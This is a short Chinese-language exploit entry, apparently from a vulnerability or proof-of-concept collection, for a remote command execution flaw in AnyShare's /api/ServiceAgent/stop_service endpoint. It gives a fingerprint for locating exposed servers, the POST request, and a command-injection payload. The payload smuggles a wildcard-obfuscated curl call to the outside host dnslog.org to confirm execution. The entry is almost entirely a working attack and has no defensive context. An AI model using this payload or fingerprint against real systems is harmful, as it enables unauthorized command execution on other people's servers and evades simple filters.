# 爱数AnyShare智能内容管理平台stop_service远程命令执行漏洞

爱数AnyShare智能内容管理平台stop_service ｜ 命令执行 ｜ —
- **指纹**：`body="/libs/hls.js/dist/hls.min.js"`
- **请求**：`POST /api/ServiceAgent/stop_service HTTP/1.1`

**Payload**
```
["com;/u?r/b?n/c??l dnslog.org"]
```
- **响应特征**：200 dnslog回显